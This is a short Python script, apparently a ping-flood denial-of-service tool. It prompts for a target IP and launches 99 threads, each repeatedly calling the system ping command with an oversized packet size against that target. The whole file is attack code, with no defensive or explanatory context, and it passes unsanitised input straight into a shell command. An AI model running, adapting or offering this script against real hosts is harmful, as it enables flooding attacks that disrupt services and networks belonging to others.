from threading import Thread
import os

target = input("target ip: ")


def ping():
    global target
    while True:
        os.system("ping -l 11830 " + target)
for i in range(1,100):
    globals()["t"+str(i)] = Thread(target=ping)

for i in range(1,100):
    globals()["t"+str(i)].start()


